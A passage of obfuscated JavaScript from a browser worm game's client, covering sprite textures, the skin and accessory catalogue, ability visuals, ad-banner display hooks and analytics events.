            } catch (_0x523fa8) {}
          }
        };
        _0xe49b43.ia = function () {
          try {
            ga("send", "event", "antiadblocker", window.runtimeHash + "_start");
          } catch (_0x146707) {}
          _0x12b91();
        };
        return _0xe49b43;
      };
      _0x2c22d1.ja = function (_0x15590d, _0x31112c) {
        var _0x418a1b = $("#" + _0x15590d);
        var _0x2a5ef3 = _0x31112c;
        var _0x1e07c8 = {};
        var _0x4f584e = false;
        _0x1e07c8.ha = function () {
          if (!_0x4f584e) {
            _0x418a1b.empty();
            _0x418a1b.append("<div id='" + _0x2a5ef3 + "'></div>");
            try {
              try {
                ga("send", "event", "banner", window.runtimeHash + "_display");
              } catch (_0xe9fe0c) {}
              aiptag.cmd.display.push(function () {
                aipDisplayTag.display(_0x2a5ef3);
              });
              _0x4f584e = true;
            } catch (_0x1ec060) {}
          }
        };
        _0x1e07c8.ka = function () {
          try {
            try {
              ga("send", "event", "banner", window.runtimeHash + "_refresh");
            } catch (_0x32eed3) {}
            aiptag.cmd.display.push(function () {
              aipDisplayTag.display(_0x2a5ef3);
            });
          } catch (_0x1bbefc) {}
        };
        return _0x1e07c8;
      };
      _0x31b4a1.la = function () {
        function _0x4eec56(_0x18ca83, _0x583b84, _0x2ae653, _0x2a7591, _0x1b67e3, _0x1725ce, _0x102230, _0x2e6291, _0x15266b, _0x201801, _0x3effa3) {
          this.ma = _0x18ca83;
          this.na = _0x583b84;
          this.oa = null;
          this.pa = false;
          this.qa = _0x2ae653;
          this.ra = _0x2a7591;
          this.sa = _0x1b67e3;
          this.ta = _0x1725ce;
          this.ua = _0x102230 || (_0x15266b || _0x1b67e3) / 2;
          this.va = _0x2e6291 || (_0x201801 || _0x1725ce) / 2;
          this.wa = _0x15266b || _0x1b67e3;
          this.xa = _0x201801 || _0x1725ce;
          this.ya = 0.5 - (this.ua - this.wa * 0.5) / this.sa;
          this.za = 0.5 - (this.va - this.xa * 0.5) / this.ta;
          this.Aa = this.sa / this.wa;
          if (_0x3effa3) {
            this.ev = _0x3effa3;
          } else {
            null;
          }
          this.Ba = this.ta / this.xa;
        }
        _0x4eec56.Ca = function () {
          return new _0x4eec56("", null, 0, 0, 0, 0, 0, 0, 0, 0);
        };
        _0x4eec56.Da = function (_0x5db58b, _0x3639fd, _0x5dda10, _0x10562d) {
          return new _0x4eec56(_0x5db58b, _0x3639fd, _0x5dda10.x, _0x5dda10.y, _0x5dda10.w, _0x5dda10.h, _0x5dda10.px, _0x5dda10.py, _0x5dda10.pw, _0x5dda10.ph, _0x10562d);
        };
        _0x4eec56.prototype.Ea = function () {
          if (this.pa) {
            return this.oa;
          }
          if (this.na != null) {
            this.oa = new _0x131478.Texture(this.na, new _0x131478.Rectangle(this.qa, this.ra, this.sa, this.ta));
          }
          this.pa = true;
          return this.oa;
        };
        _0x4eec56.prototype.Fa = function () {
          if (this.oa != null) {
            this.oa.destroy();
          }
        };
        return _0x4eec56;
      }();
      _0x31b4a1.Ga = function () {
        function _0x3b4919(_0x1d5dae, _0x426440, _0x15b330, _0x1e0802, _0x44c240, _0x41c4e0, _0x152278, _0x56fce3, _0x36a827, _0x2ee25c, _0x94f7da, _0x167318, _0xba0d53, _0x2e4cc3, _0x2b12d4, _0x55047a, _0x4b0483, _0x2f139d) {
          this.Ha = _0x1d5dae;
          this.Ia = _0x426440;
          this.Ja = _0x15b330;
          this.Ka = _0x1e0802;
          this.La = _0x44c240;
          this.Ma = _0x41c4e0;
          this.Na = _0x152278;
          this.Oa = _0x56fce3;
          this.Pa = _0x36a827;
          this.Qa = _0x2ee25c;
          this.Ra = _0x94f7da;
          this.Sa = _0x167318;
          this.Ta = _0xba0d53;
          this.Ua = _0x2e4cc3;
          this.Va = _0x2b12d4;
          this.Wa = _0x55047a;
          this.Xa = _0x4b0483;
          this.Ya = _0x2f139d;
        }
        _0x3b4919.prototype.Fa = function () {
          for (var _0x454e61 = 0; _0x454e61 < this.Ha.length; _0x454e61++) {
            this.Ha[_0x454e61].dispose();
            this.Ha[_0x454e61].destroy();
          }
          this.Ha = [];
          for (var _0x465f39 = 0; _0x465f39 < this.Ia.length; _0x465f39++) {
            this.Ia[_0x465f39].Fa();
          }
          this.Ia = [];
        };
        _0x3b4919.Ca = function () {
          var _0x45f05c = new _0x3b4919.Za(_0x31b4a1._a.$a, _0x31b4a1._a.$a);
          var _0x23d9bd = new _0x3b4919.ab("#ffffff", [_0x31b4a1._a.$a], [_0x31b4a1._a.$a]);
          return new _0x3b4919([], [], {}, _0x45f05c, {}, new _0x3b4919.bb(_0x31b4a1._a.$a), {}, _0x23d9bd, {}, new _0x3b4919.cb("", _0x23d9bd, _0x45f05c), {}, new _0x3b4919.db([_0x31b4a1._a.$a]), {}, new _0x3b4919.db([_0x31b4a1._a.$a]), {}, new _0x3b4919.db([_0x31b4a1._a.$a]), {}, new _0x3b4919.db([_0x31b4a1._a.$a]));
        };
        _0x3b4919.eb = function (_0x3a9235, _0x122f65, _0x4ed960, _0x5907c9) {
          var _0x435079 = new _0x3b4919.Za(_0x31b4a1._a.$a, _0x31b4a1._a.$a);
          var _0x55ed0a = new _0x3b4919.ab("#ffffff", [_0x3a9235], [_0x122f65]);
          return new _0x3b4919([], [], {}, _0x435079, {}, new _0x3b4919.bb(_0x31b4a1._a.$a), {}, _0x55ed0a, {}, new _0x3b4919.cb("", _0x55ed0a, _0x435079), {}, new _0x3b4919.db([_0x4ed960]), {}, new _0x3b4919.db([_0x5907c9]), {}, new _0x3b4919.db([_0x31b4a1._a.$a]), {}, new _0x3b4919.db([_0x31b4a1._a.$a]));
        };
        _0x3b4919.fb = function (_0x13d2b4, _0xc910bc, _0x332a98, _0x2f2973) {
          var _0xac104e = {};
          _0x2c22d1._(_0x13d2b4.colorDict, function (_0x3c1f86, _0x31d4d8) {
            _0xac104e[_0x3c1f86] = "#" + _0x31d4d8;
          });
          var _0x4591f3 = {};
          for (var _0x270e94 = 0; _0x270e94 < _0x13d2b4.skinArrayDict.length; _0x270e94++) {
            var _0x2713a5 = _0x13d2b4.skinArrayDict[_0x270e94];
            _0x4591f3[_0x2713a5.id] = new _0x3b4919.ab(_0xac104e[_0x2713a5.prime], _0x2713a5.base.map(function (_0x19b1a4) {
              return _0xc910bc[_0x19b1a4];
            }), _0x2713a5.glow.map(function (_0x54b47b, _0x246c40) {
              return _0xc910bc[_0x54b47b];
            }));
            if (_0x2713a5.glow[0] == "a_trans") {
              _0x4591f3[_0x2713a5.id].vbb = _0xc910bc.a_black;
            }
          }
          var _0x42d567 = undefined;
          var _0x5e1978 = _0x13d2b4.skinUnknown;
          try {
            _0x42d567 = new _0x3b4919.ab(_0xac104e[_0x5e1978.prime], _0x5e1978.base.map(function (_0x4437b7) {
              return _0xc910bc[_0x4437b7];
            }), _0x5e1978.glow.map(function (_0x47ccbb) {
              return _0xc910bc[_0x47ccbb];
            }));
          } catch (_0x21b3dc) {}
          var _0x325305 = {};
          _0x2c22d1._(_0x13d2b4.eyesDict, function (_0x3b8493, _0xb35263) {
            var _0x10f507 = parseInt(_0x3b8493);
            _0x325305[_0x10f507] = new _0x3b4919.db(_0xb35263.base.map(function (_0x5aa044) {
              return _0xc910bc[_0x5aa044.region];
            }));
          });
          var _0x3063f7 = new _0x3b4919.db(_0x13d2b4.eyesUnknown.base.map(function (_0x224abd) {
            return _0xc910bc[_0x224abd.region];
          }));
          var _0x5a6f3 = {};
          _0x2c22d1._(_0x13d2b4.mouthDict, function (_0x22cbb4, _0x3b54de) {
            var _0x2157d2 = parseInt(_0x22cbb4);
            _0x5a6f3[_0x2157d2] = new _0x3b4919.db(_0x3b54de.base.map(function (_0x1b92cf) {
              return _0xc910bc[_0x1b92cf.region];
            }));
          });
          var _0x48b7d8 = new _0x3b4919.db(_0x13d2b4.mouthUnknown.base.map(function (_0x30d4f9) {
            return _0xc910bc[_0x30d4f9.region];
          }));
          var _0x505388 = {};
          _0x2c22d1._(_0x13d2b4.hatDict, function (_0x237948, _0x2d18e0) {
            var _0x11e5f1 = parseInt(_0x237948);
            _0x505388[_0x11e5f1] = new _0x3b4919.db(_0x2d18e0.base.map(function (_0x36d459) {
              return _0xc910bc[_0x36d459.region];
            }));
          });
          var _0xd7b69c = new _0x3b4919.db(_0x13d2b4.hatUnknown.base.map(function (_0x52f543) {
            return _0xc910bc[_0x52f543.region];
          }));
          var _0x3446e0 = {};
          _0x2c22d1._(_0x13d2b4.glassesDict, function (_0x48f5c8, _0xb73ed7) {
            var _0x1cbc59 = parseInt(_0x48f5c8);
            _0x3446e0[_0x1cbc59] = new _0x3b4919.db(_0xb73ed7.base.map(function (_0x4a8ccc) {
              return _0xc910bc[_0x4a8ccc.region];
            }));
          });
          var _0x4f17bc = new _0x3b4919.db(_0x13d2b4.glassesUnknown.base.map(function (_0x6f2064) {
            return _0xc910bc[_0x6f2064.region];
          }));
          var _0x4c433c = {};
          _0x2c22d1._(_0x13d2b4.portionDict, function (_0x23d96c, _0x4d26a0) {
            _0x23d96c = parseInt(_0x23d96c);
            _0x4c433c[_0x23d96c] = new _0x3b4919.Za(_0xc910bc[_0x4d26a0.base], _0xc910bc[_0x4d26a0.glow]);
          });
          var _0x373b4e = undefined;
          var _0x11035b = _0x13d2b4.portionUnknown;
          _0x373b4e = new _0x3b4919.Za(_0xc910bc[_0x11035b.base], _0xc910bc[_0x11035b.glow]);
          var _0x4a8a04 = {};
          _0x2c22d1._(_0x13d2b4.abilityDict, function (_0x1df741, _0x1a6350) {
            _0x1df741 = parseInt(_0x1df741);
            _0x4a8a04[_0x1df741] = new _0x3b4919.bb(_0xc910bc[_0x1a6350.base]);
          });
          var _0x3c9f23 = undefined;
          var _0x3922d7 = _0x13d2b4.abilityUnknown;
          _0x3c9f23 = new _0x3b4919.bb(_0xc910bc[_0x3922d7.base]);
          var _0x5b489a = {};
          _0x2c22d1._(_0x13d2b4.teamDict, function (_0x5b4bb2, _0x15f073) {
            _0x5b4bb2 = parseInt(_0x5b4bb2);
            _0x5b489a[_0x5b4bb2] = new _0x3b4919.cb(_0x15f073.title, new _0x3b4919.ab(_0xac104e[_0x15f073.skin.prime], null, _0x15f073.skin.glow.map(function (_0x389c7d) {
              return _0xc910bc[_0x389c7d];
            })), new _0x3b4919.Za(null, _0xc910bc[_0x15f073.portion.glow]));
          });
          var _0x3a438f = new _0x3b4919.cb({}, _0x42d567, _0x373b4e);
          return new _0x3b4919(_0x332a98, _0x2f2973, _0x4c433c, _0x373b4e, _0x4a8a04, _0x3c9f23, _0x4591f3, _0x42d567, _0x5b489a, _0x3a438f, _0x325305, _0x3063f7, _0x5a6f3, _0x48b7d8, _0x505388, _0xd7b69c, _0x3446e0, _0x4f17bc);
        };
        _0x3b4919.prototype.gb = function (_0x24d4ee) {
          var _0x5111a1 = _0x2c22d1.aa(Object.keys(this.Na)).slice(0, _0x24d4ee);
          var _0x3f1a66 = _0x2c22d1.aa(Object.keys(this.Ra)).slice(0, _0x24d4ee);
          var _0x51f55b = _0x2c22d1.aa(Object.keys(this.Ta)).slice(0, _0x24d4ee);
          var _0x1ada86 = _0x2c22d1.aa(Object.keys(this.Va)).slice(0, _0x24d4ee);
          var _0x74b40 = _0x2c22d1.aa(Object.keys(this.Xa)).slice(0, _0x24d4ee);
          var _0x410669 = [];
          for (var _0x348926 = 0; _0x348926 < _0x24d4ee; _0x348926++) {
            var _0x277b8e = _0x5111a1.length > 0 ? _0x5111a1[_0x348926 % _0x5111a1.length] : 0;
            var _0x5353ed = _0x3f1a66.length > 0 ? _0x3f1a66[_0x348926 % _0x3f1a66.length] : 0;
            var _0xf32611 = _0x51f55b.length > 0 ? _0x51f55b[_0x348926 % _0x51f55b.length] : 0;
            var _0x5cfad2 = _0x1ada86.length > 0 ? _0x1ada86[_0x348926 % _0x1ada86.length] : 0;
            var _0x5e4d9d = _0x74b40.length > 0 ? _0x74b40[_0x348926 % _0x74b40.length] : 0;
            _0x410669.push(new _0x31b4a1.hb(_0x277b8e, _0x5353ed, _0xf32611, _0x5cfad2, _0x5e4d9d));
          }
          return _0x410669;
        };
        _0x3b4919.prototype.ib = function (_0x50e97c) {
          if (this.Na.hasOwnProperty(_0x50e97c)) {
            return this.Na[_0x50e97c];
          } else {
            return this.Oa;
          }
        };
        _0x3b4919.prototype.jb = function (_0x2c0d76) {
          if (this.Pa.hasOwnProperty(_0x2c0d76)) {
            return this.Pa[_0x2c0d76];
          } else {
            return this.Qa;
          }
        };
        _0x3b4919.prototype.kb = function (_0x5a0302) {
          if (this.Ra.hasOwnProperty(_0x5a0302)) {
            return this.Ra[_0x5a0302];
          } else {
            return this.Sa;
          }
        };
        _0x3b4919.prototype.lb = function (_0x5a5c65) {
          if (this.Ta.hasOwnProperty(_0x5a5c65)) {
            return this.Ta[_0x5a5c65];
          } else {
            return this.Ua;
          }
        };
        _0x3b4919.prototype.mb = function (_0x27e181) {
          if (this.Xa.hasOwnProperty(_0x27e181)) {
            return this.Xa[_0x27e181];
          } else {
            return this.Ya;
          }
        };
        _0x3b4919.prototype.nb = function (_0x3fa3ed) {
          if (this.Va.hasOwnProperty(_0x3fa3ed)) {
            return this.Va[_0x3fa3ed];
          } else {
            return this.Wa;
          }
        };
        _0x3b4919.prototype.ob = function (_0x58d71b) {
          if (this.Ja.hasOwnProperty(_0x58d71b)) {
            return this.Ja[_0x58d71b];
          } else {
            return this.Ka;
          }
        };
        _0x3b4919.prototype.pb = function (_0x22bcc1) {
          if (this.La.hasOwnProperty(_0x22bcc1)) {
            return this.La[_0x22bcc1];
          } else {
            return this.Ma;
          }
        };
        _0x3b4919.cb = function () {
          function _0x11e070(_0x60dfb1, _0x1834e1, _0x3b131d) {
            this.qb = _0x60dfb1;
            this.rb = _0x1834e1;
            this.sb = _0x3b131d;
          }
          return _0x11e070;
        }();
        _0x3b4919.ab = function () {
          function _0x30ea98(_0x42fad3, _0x1c213a, _0x62e502) {
            this.tb = _0x42fad3;
            this.ub = _0x1c213a;
            this.vb = _0x62e502;
          }
          return _0x30ea98;
        }();
        _0x3b4919.db = function () {
          function _0x5ce551(_0x45687f) {
            this.ub = _0x45687f;
          }
          return _0x5ce551;
        }();
        _0x3b4919.Za = function () {
          function _0x598a09(_0x2623be, _0x54bb3e) {
            this.ub = _0x2623be;
            this.vb = _0x54bb3e;
          }
          return _0x598a09;
        }();
        _0x3b4919.bb = function () {
          function _0x56784a(_0x51af77) {
            this.ub = _0x51af77;
          }
          return _0x56784a;
        }();
        return _0x3b4919;
      }();
      _0x31b4a1._a = function () {
        function _0x3d2952() {
          var _0x2a431c = _0x131478.BaseTexture.from("/images/wear-ability.png");
          this.wb = new _0x31b4a1.la("magnet_ability", _0x2a431c, 158, 86, 67, 124, 148, 63.5, 128, 128);
          this.xb = new _0x31b4a1.la("velocity_ability", _0x2a431c, 158, 4, 87, 74, 203, 63.5, 128, 128);
          this.yb = new _0x31b4a1.la("flex_ability", _0x2a431c, 4, 4, 146, 146, 63.5, 63.5, 128, 128);
          var _0xb49921 = _0x131478.BaseTexture.from(atob(savedImages[35]));
          this.pwrFlex1 = new _0x31b4a1.la("flex_ability", _0xb49921, 158, 4, 87, 74, 203, 63.5, 128, 128);
          var _0x4c4fbd = _0x131478.BaseTexture.from(atob(savedImages[68]));
          this.pwrFlex2 = new _0x31b4a1.la("flex_ability", _0x4c4fbd, 156, 140, 87, 60, 170, 128.5, 128, 128);
          this.pwrFlex3 = new _0x31b4a1.la("flex_ability", _0x4c4fbd, 156, 4, 87, 74, 285, 63.5, 128, 128);
          var _0x58458b = _0x131478.BaseTexture.from("/images/def-look.png");
          var _0x2e6d19 = new _0x31b4a1.la("def_eyes", _0x58458b, 0, 0, 42, 80, 75, 64, 128, 128);
          var _0x18c1bd = new _0x31b4a1.la("def_mouth", _0x58458b, 46, 0, 20, 48, 109, 63, 128, 128);
          var _0x247f93 = new _0x31b4a1.la("def_skin_glow", _0x58458b, 70, 0, 32, 32, 0, 0, 0, 0);
          var _0x298386 = new _0x31b4a1.la("def_skin_base", _0x58458b, 46, 52, 64, 64, 0, 0, 0, 0);
          var _0x26eea5 = _0x31b4a1.Ga.eb(_0x298386, _0x247f93, _0x2e6d19, _0x18c1bd);
          _wup.mySkin = _0x26eea5;
          this.zb = new _0x31b4a1.Ab({}, _0x26eea5);
          this.Bb = -10000;
          this.Cb = -10000;
          this.Db = function () {
            var _0x16f9a8 = window.document.createElement("canvas");
            _0x16f9a8.width = 80;
            _0x16f9a8.height = 80;
            return {
              Eb: _0x16f9a8,
              Fb: _0x16f9a8.getContext("2d"),
              oa: new _0x131478.Texture(_0x131478.BaseTexture.from(_0x16f9a8))
            };
          }();
          this.Gb = null;
          this.Hb = [];
        }
        _0x3d2952.$a = _0x31b4a1.la.Ca();
        _0x3d2952.prototype.ha = function () {};
        _0x3d2952.prototype.Ib = function (_0x569d87, _0x5238e8, _0x58e9e6) {
          var _0x1bd293 = this;
          var _0xb03e16 = this.zb.Jb();
          if (_0xb03e16 > 0 && Date.now() - this.Bb < 1200000) {
            if (_0x569d87 != null) {
              _0x569d87();
            }
            return;
          }
          if (this.Gb != null && !this.Gb.Kb()) {
            if (Date.now() - this.Bb < 300000) {
              if (_0x569d87 != null) {
                _0x569d87();
              }
              return;
            }
            this.Gb.Lb();
            this.Gb = null;
          }
          var _0x44c305 = new _0x31b4a1.Mb(_0xb03e16);
          _0x44c305.Nb(function (_0x22fd7c, _0x265b46) {
            if (_0x44c305 === _0x1bd293.Gb && _0x58e9e6 != null) {
              _0x58e9e6(_0x22fd7c, _0x265b46);
            }
          });
          _0x44c305.Ob(function (_0xfa04f5) {
            if (_0x44c305 === _0x1bd293.Gb && _0x5238e8 != null) {
              _0x5238e8(_0xfa04f5);
            }
          });
          _0x44c305.Pb(function () {
            if (_0x44c305 === _0x1bd293.Gb && _0x5238e8 != null) {
              _0x5238e8(new Error());
            }
          });
          _0x44c305.Qb(function () {
            if (_0x44c305 === _0x1bd293.Gb && _0x569d87 != null) {
              _0x569d87();
            }
          });
          _0x44c305.Rb(function (_0x2fd77f) {
            if (_0x44c305 === _0x1bd293.Gb) {
              _0x1bd293.Cb = Date.now();
              _0x1bd293.Gb = null;
              _0x1bd293.Sb();
              _0x1bd293.zb.Ub().Fa();
              _0x1bd293.zb = _0x2fd77f;
              if (_0x569d87 != null) {
                _0x569d87();
              }
              _0x1bd293.Tb();
              return;
            }
            try {
              _0x2fd77f.Ub().Fa();
            } catch (_0x2982ea) {}
          });
          _0x44c305.Vb();
          this.Bb = Date.now();
          this.Gb = _0x44c305;
        };
        _0x3d2952.prototype.Sb = function () {};
        _0x3d2952.prototype.Wb = function () {
          return this.zb.Jb() > 0;
        };
        _0x3d2952.prototype.Xb = function () {
          return this.zb.Yb();
        };
        _0x3d2952.prototype.Zb = function () {
          return this.Db;
        };
        _0x3d2952.prototype.$b = function (_0x2b1246) {
          this.Hb.push(_0x2b1246);
        };
        _0x3d2952.prototype.Tb = function () {
          for (var _0x5785a3 = 0; _0x5785a3 < this.Hb.length; _0x5785a3++) {
            this.Hb[_0x5785a3]();
          }
        };
        _0x3d2952.prototype.Ub = function () {
          return this.zb.Ub();
        };
        return _0x3d2952;
      }();
      _0x31b4a1._b = function () {
        function _0x196787(_0x5ae0b8) {
          this.ac = _0x5ae0b8;
        }
        _0x196787.prototype.bc = function (_0x294473) {
          return this.ac[_0x294473];
        };
        _0x196787.cc = function () {
          function _0x39e16c() {
            this.dc = [];
          }
          _0x39e16c.prototype.ec = function (_0x36ae33, _0x36e246) {
            for (var _0x27b8d4 = 0; _0x27b8d4 < this.dc.length; _0x27b8d4++) {
              if (this.dc[_0x27b8d4].fc === _0x36ae33) {
                throw new Error();
              }
            }
            this.dc.push(new _0x196787.gc(_0x36ae33, _0x36e246));
            return this;
          };
          _0x39e16c.prototype.hc = function () {
            var _0x3f5781 = 0;
            for (var _0x1dd8b9 = 0; _0x1dd8b9 < this.dc.length; _0x1dd8b9++) {
              _0x3f5781 += this.dc[_0x1dd8b9].ic;
            }
            var _0x3ffb46 = {};
            var _0x333b27 = 0;
            for (var _0x5cd9c1 = 0; _0x5cd9c1 < this.dc.length; _0x5cd9c1++) {
              var _0x2e3958 = this.dc[_0x5cd9c1];
              _0x2e3958.ic = _0x2e3958.ic / _0x3f5781;
              _0x2e3958.jc = _0x333b27;
              _0x2e3958.kc = _0x333b27 + _0x2e3958.ic;
              _0x333b27 = _0x2e3958.kc;
              _0x3ffb46[_0x2e3958.fc] = _0x2e3958;
            }
            return new _0x196787(_0x3ffb46);
          };
          return _0x39e16c;
        }();
        _0x196787.gc = function () {
          function _0x2b61c5(_0x2d833a, _0x4bbc49) {
            this.fc = _0x2d833a;
            this.ic = _0x4bbc49;
            this.jc = 0;
            this.kc = 0;
          }
          _0x2b61c5.prototype.lc = function (_0x54a7a3) {
            return this.jc + (this.kc - this.jc) * _0x54a7a3;
          };
          return _0x2b61c5;
        }();
        return _0x196787;
      }();
      _0x31b4a1.WormSpriteTree = function () {
        function _0xcb8892() {
          this.nc = new _0x131478.Container();
          this.nc.sortableChildren = true;
          this.oc = new _0x137cf4();
          this.oc.zIndex = _0x40ebc4 * ((_0x571a46 + 1) * 2 + 1 + 3);
          this.pc = 0;
          this.qc = new Array(_0x571a46);
          this.qc[0] = this.rc(0, new _0x31b4a1.sc(), new _0x31b4a1.sc());
          for (var _0x538313 = 1; _0x538313 < _0x571a46; _0x538313++) {
            this.qc[_0x538313] = this.rc(_0x538313, new _0x31b4a1.sc(), new _0x31b4a1.sc());
          }
          this.tc = 0;
          this.uc = 0;
          this.vc = 0;
        }
        var _0x40ebc4 = 0.001;
        var _0x571a46 = 797;
        var _0x1a1b4b = -0.06640625;
        var _0xe298ab = 0.84375;
        var _0x385200 = 0.2578125;
        var _0x19b4be = -0.03515625;
        var _0x50ad8a = -0.0625;
        var _0x174bf1 = 0.5625;
        var _0x204fd8 = _0x1a1b4b * 3 + _0xe298ab;
        var _0x7e05e2 = _0x385200 - _0x1a1b4b * 3;
        var _0x217179 = _0x1a1b4b + _0x19b4be;
        var _0xb68e4f = 0.375;
        var _0x183676 = 0.75;
        var _0x393791 = _0x50ad8a + _0x50ad8a;
        var _0x827e28 = _0x19b4be * 3 + _0x385200;
        var _0x1f0075 = _0xe298ab - _0x19b4be * 3;
        var _0x1c3c91 = _0x19b4be + _0x1a1b4b;
        _0xcb8892.wc = _0x571a46;
        _0xcb8892.prototype.rc = function (_0x25bf29, _0x559f07, _0x281246) {
          var _0x22db31 = new _0x2ded01(_0x559f07, _0x281246);
          _0x559f07.xc.zIndex = _0x40ebc4 * ((_0x571a46 - _0x25bf29) * 2 + 1 + 3);
          _0x281246.xc.zIndex = _0x40ebc4 * ((_0x571a46 - _0x25bf29) * 2 - 2 + 3);
          return _0x22db31;
        };
        _0xcb8892.prototype.yc = function (_0x18e277, _0x582482, _0x57d69d, _0x3ea456, _0x340fec, _0x541845, _0x1c04ca, _0x4f614a) {
          var _0x1224d8 = _0x57d69d.ub;
          var _0x212963 = _0x18e277 === _0x31b4a1.Ac.zc ? _0x582482.rb.vb : _0x57d69d.vb;
          if (_0x1224d8.length > 0 && _0x212963.length > 0) {
            for (var _0x2fd1be = 0; _0x2fd1be < this.qc.length; _0x2fd1be++) {
              this.qc[_0x2fd1be].Cc.Bc(_0x1224d8[_0x2fd1be % _0x1224d8.length], _0x2fd1be % _0x1224d8.length, _0x2fd1be);
              this.qc[_0x2fd1be].Dc.Bc(_0x2fd1be == 0 && _0x57d69d.vbb ? _0x57d69d.vbb : _0x212963[_0x2fd1be % _0x212963.length], _0x2fd1be % _0x1224d8.length, _0x2fd1be);
              this.qc[_0x2fd1be].Cc.Ec(_0x4f614a);
              this.qc[_0x2fd1be].Dc.Ec(_0x4f614a);
            }
          }
          this.oc.yc(_0x3ea456, _0x340fec, _0x541845, _0x1c04ca);
        };
        var _0x137cf4 = function () {
          var _0x3b69a2 = _0x2c22d1.M(_0x131478.Container, function () {
            _0x131478.Container.call(this);
            this.sortableChildren = true;
            this.Fc = [];
            this.Gc = [];
            this.Hc = [];
            this.Ic = [];
            this.Jc = new _0x131478.Container();
            this.Kc = [];
            this.message = new _0x131478.Container();
            for (var _0x1f3433 = 0; _0x1f3433 < 4; _0x1f3433++) {
              var _0x1405c7 = new _0x31b4a1.sc();
              _0x1405c7.Bc(_0xe610a0().Lc.wb);
              this.Jc.addChild(_0x1405c7.xc);
              this.Kc.push(_0x1405c7);
            }
            this.message.zIndex = 0.0012;
            this.addChild(this.message);
            this.VcUn();
            this.Jc.zIndex = 0.0011;
            this.addChild(this.Jc);
            this.Mc();
            this.Nc = new _0x31b4a1.sc();
            this.Nc.Bc(_0xe610a0().Lc.xb);
            this.Nc.xc.zIndex = 0.001;
            this.addChild(this.Nc.xc);
            this.Oc();
            this.pwr_flex1 = new _0x31b4a1.sc();
            this.pwr_flex1.Bc(_0xe610a0().Lc.pwrFlex1);
            this.pwr_flex1.xc.zIndex = 0.002;
            this.addChild(this.pwr_flex1.xc);
            this.pwr_flex2 = new _0x31b4a1.sc();
            this.pwr_flex2.Bc(_0xe610a0().Lc.pwrFlex2);
            this.pwr_flex2.xc.zIndex = 0.001;
            this.addChild(this.pwr_flex2.xc);
            this.pwr_flex3 = new _0x31b4a1.sc();
            this.pwr_flex3.Bc(_0xe610a0().Lc.pwrFlex3);
            this.pwr_flex3.xc.zIndex = 0.001;
            this.addChild(this.pwr_flex3.xc);
            this.disableFlex();
          });
          _0x3b69a2.prototype.yc = function (_0x1c5ffa, _0x1cdb24, _0x36f251, _0x4991c2) {
            this.Pc(0.002, this.Fc, _0x1c5ffa.ub);
            this.Pc(0.003, this.Gc, _0x1cdb24.ub);
            this.Pc(0.004, this.Ic, _0x4991c2.ub);
            this.Pc(0.005, this.Hc, _0x36f251.ub);
          };
          _0x3b69a2.prototype.Pc = function (_0x3c522f, _0x5f0b2a, _0x1d88ba) {
            while (_0x1d88ba.length > _0x5f0b2a.length) {
              var _0x124111 = new _0x31b4a1.sc();
              _0x5f0b2a.push(_0x124111);
              this.addChild(_0x124111.Qc());
            }
            while (_0x1d88ba.length < _0x5f0b2a.length) {
              _0x5f0b2a.pop().Rc();
            }
            var _0xf5b874 = _0x3c522f;
            for (var _0x707a97 = 0; _0x707a97 < _0x1d88ba.length; _0x707a97++) {
              _0xf5b874 += 0.0001;
              var _0x3c72d5 = _0x5f0b2a[_0x707a97];
              _0x3c72d5.Bc(_0x1d88ba[_0x707a97]);
              _0x3c72d5.xc.zIndex = _0xf5b874;
            }
          };
          _0x3b69a2.prototype.Sc = function (_0x2e7c44, _0x165830, _0x2dafb8, _0x3a216c) {
            this.visible = true;
            this.position.set(_0x2e7c44, _0x165830);
            this.rotation = _0x3a216c;
            for (var _0x1c9a4d = 0; _0x1c9a4d < this.Fc.length; _0x1c9a4d++) {
              this.Fc[_0x1c9a4d].Tc(_0x2dafb8);
            }
            for (var _0x4fdce1 = 0; _0x4fdce1 < this.Gc.length; _0x4fdce1++) {
              this.Gc[_0x4fdce1].Tc(_0x2dafb8);
            }
            for (var _0x1a654b = 0; _0x1a654b < this.Hc.length; _0x1a654b++) {
              this.Hc[_0x1a654b].Tc(_0x2dafb8);
            }
            for (var _0x1a7ce9 = 0; _0x1a7ce9 < this.Ic.length; _0x1a7ce9++) {
              this.Ic[_0x1a7ce9].Tc(_0x2dafb8);
            }
          };
          _0x3b69a2.prototype.Uc = function () {
            this.visible = false;
          };
          _0x3b69a2.prototype.VcAc = function (_0x538255, _0x32ac0a, _0x4fb7ef, _0x5da9fc, _0x299a16) {
            this.message.visible = true;
            this.Mc2.Tc(_0x32ac0a);
          };
          _0x3b69a2.prototype.VcUn = function () {
            this.message.visible = false;
          };
          _0x3b69a2.prototype.Vc = function (_0x256125, _0x271379, _0x12a6a3, _0x445690) {
            this.Jc.visible = true;
            var _0x36bec0 = _0x12a6a3 / 1000;
            var _0x1a3b9b = 1 / this.Kc.length;
            for (var _0x31d380 = 0; _0x31d380 < this.Kc.length; _0x31d380++) {
              var _0x1c522d = 1 - (_0x36bec0 + _0x1a3b9b * _0x31d380) % 1;
              this.Kc[_0x31d380].xc.alpha = 1 - _0x1c522d;
              this.Kc[_0x31d380].Tc(_0x271379 * (0.5 + _0x1c522d * 4.5));
            }
          };
          _0x3b69a2.prototype.Mc = function () {
            this.Jc.visible = false;
          };
          _0x3b69a2.prototype.Wc = function (_0x959957, _0x3be9b2, _0x551a72, _0x5d3d9a) {
            this.Nc.xc.visible = window.vps.vp;
            this.Nc.xc.alpha = _0x2c22d1.Q(this.Nc.xc.alpha, _0x959957.Xc ? 0.9 : 0.4, _0x5d3d9a, 0.0025);
            this.Nc.Tc(_0x3be9b2);
          };
          _0x3b69a2.prototype.xd = function () {
            this.Nc.xc.visible = false;
          };
          _0x3b69a2.prototype.activeFlex = function (_0x4c7500, _0x4500c0, _0x2dc46d, _0x1c6d99) {
            this.pwr_flex1.xc.visible = window.vps.flx === 1;
            this.pwr_flex1.xc.alpha = _0x2c22d1.Q(this.Nc.xc.alpha, _0x4c7500.Xc ? 1 : 1, _0x1c6d99, 1);
            this.pwr_flex1.Tc(_0x4500c0);
            this.pwr_flex2.xc.visible = window.vps.flx === 2;
            this.pwr_flex2.xc.alpha = _0x2c22d1.Q(this.Nc.xc.alpha, _0x4c7500.Xc ? 0.9 : 0.4, _0x1c6d99, 0.0025);
            this.pwr_flex2.Tc(_0x4500c0);
            this.pwr_flex3.xc.visible = window.vps.flx === 3;
            this.pwr_flex3.xc.alpha = _0x2c22d1.Q(this.Nc.xc.alpha, _0x4c7500.Xc ? 0.9 : 0.4, _0x1c6d99, 0.0025);
            this.pwr_flex3.Tc(_0x4500c0);
          };
